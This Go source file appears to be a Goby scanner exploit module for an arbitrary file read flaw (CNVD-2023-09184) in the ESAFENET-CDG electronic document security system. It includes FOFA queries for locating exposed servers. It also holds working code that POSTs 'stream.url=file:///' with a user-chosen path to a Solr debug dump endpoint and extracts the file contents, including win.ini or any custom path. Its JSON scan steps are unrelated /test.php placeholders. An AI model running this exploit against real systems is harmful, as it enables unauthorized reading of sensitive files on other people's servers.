package exploits

import (
	"strings"
  "regexp"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "ESAFENET-CDG /dump File Read Vulnerability(CNVD-2023-09184)",
    "Description": "<p>Esaitong electronic document security management system is an electronic document security encryption software. </p><p>There is an arbitrary file reading vulnerability in the electronic document security management system of EST, which can be exploited by attackers to obtain sensitive information.</p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/product/277483397",
    "DisclosureDate": "2023-02-22",
    "PostTime": "2024-07-31",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": " title==\"电子文档安全管理系统\" && body=\"CDGServer3\"",
    "GobyQuery": " title==\"电子文档安全管理系统\" && body=\"CDGServer3\"",
    "Level": "1",
    "Impact": "<p>There is an arbitrary file reading vulnerability in the electronic document security management system of EST, which can be exploited by attackers to obtain sensitive information.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.esafenet.com/\">http://www.esafenet.com/</a></p>",
    "References": [
        "https://avd.aliyun.com/detail?id=AVD-2023-1700216"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "C:\\,win.ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "C:\\",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Directory Traversal",
        "File Read",
        "2H1W"
    ],
    "VulType": [
        "Directory Traversal",
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2023-09184"
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档安全管理系统 /dump 文件读取漏洞（CNVD-2023-09184）",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>亿赛通电子文档安全管理系统是一款电子文档安全加密软件。</p><p>亿赛通电子文档安全管理系统存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息。<br></p>",
            "Recommendation": "<p>目前厂商已提供相关漏洞补丁链接，请关注厂商主页及时更新：<a href=\"http://www.esafenet.com/\">http://www.esafenet.com/</a><br></p>",
            "Impact": "<p>亿赛通电子文档安全管理系统存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息。<br></p>",
            "VulType": [
                "目录遍历",
                "文件读取"
            ],
            "Tags": [
                "目录遍历",
                "文件读取",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "ESAFENET-CDG /dump File Read Vulnerability(CNVD-2023-09184)",
            "Product": "ESAFENET-CDG",
            "Description": "<p>Esaitong electronic document security management system is an electronic document security encryption software.&nbsp;</p><p>There is an arbitrary file reading vulnerability in the electronic document security management system of EST, which can be exploited by attackers to obtain sensitive information.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.esafenet.com/\">http://www.esafenet.com/</a><br></p>",
            "Impact": "<p>There is an arbitrary file reading vulnerability in the electronic document security management system of EST, which can be exploited by attackers to obtain sensitive information.<br></p>",
            "VulType": [
                "Directory Traversal",
                "File Read"
            ],
            "Tags": [
                "Directory Traversal",
                "File Read",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10984"
}`
	postOrGet_advnunfvh81ujfi3uh871hfbuy3gyduy1 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewPostRequestConfig("/solr/flow/debug/dump?param=ContentStreams")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Data = "stream.url=file:///" + fileUrl
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
			if resp.StatusCode == 200 {
				respTxt = resp.RawBody
				return respTxt, nil
			}
		}
		return respTxt, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/solr/flow/debug/dump?param=ContentStreams"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"C:\\": "Program Files",
			}
			// 函数继承
			uploadFileFunc := postOrGet_advnunfvh81ujfi3uh871hfbuy3gyduy1

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"C:\\":    {"C:\\", "Program Files"},
				"win.ini": {"C:\\Windows\\win.ini", "[extensions]"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_advnunfvh81ujfi3uh871hfbuy3gyduy1

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			re, _ := regexp.Compile(`name="stream"[\s\S]*?>((.|\n)*?)</str>`)
      if !re.MatchString(resp) {
        expResult.Success = false
        expResult.Output += "false"
        return expResult
      }
      resp = re.FindStringSubmatch(resp)[1]
			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
